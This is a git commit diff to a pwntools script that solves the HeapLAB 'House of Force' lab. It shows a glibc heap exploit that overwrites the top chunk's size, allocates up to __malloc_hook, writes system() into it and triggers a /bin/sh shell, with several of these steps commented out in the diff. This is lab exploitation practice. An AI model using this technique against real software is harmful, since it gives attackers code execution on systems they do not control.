18bfeed6ed8e4cede3e073c71ab8c9bbeda50c0d
huhu-bye <tkien01102007@gmail.com>
2026-03-27 21:15:20 +0700

    message

--- pwn/heaplab/HeapLAB/house_of_force/pwntools_solution-shell.py
+++ pwn/heaplab/HeapLAB/house_of_force/pwntools_solution-shell.py
@@ -40,20 +40,20 @@ io.timeout = 0.1
 
 # Request a chunk; overflow its user data and overwrite the top chunk's size field with a large value.
 # Write a "/bin/sh" string here if not using the one in libc.
-malloc(24, b"/bin/sh\0" + b"Y"*16 + p64(0xfffffffffffffff1))
+malloc(24, b"Y"*24 + p64(0xfffffffffffffff1))
 
 # Make a very large request that spans the gap between the top chunk and the malloc hook.
 # Target the malloc hook because the designer can't explicitly call free().
-malloc((libc.sym.__malloc_hook - 0x20) - (heap + 0x20), b"Y")
+#malloc((libc.sym.__malloc_hook - 0x20) - (heap + 0x20), b"Y")
 
 # The next chunk to be requested overlaps the malloc hook; overwrite it with the address of system().
-malloc(24, p64(libc.sym.system))
+#malloc(24, p64(libc.sym.system))
 
 
 # ---  OPTION 1  ---
 
 # Call malloc() with the address of the string "/bin/sh" in libc as its argument to trigger system("/bin/sh").
-malloc(next(libc.search(b"/bin/sh")), b"")
+#malloc(next(libc.search(b"/bin/sh")), b"")
 
 
 # ---  OPTION 2  ---
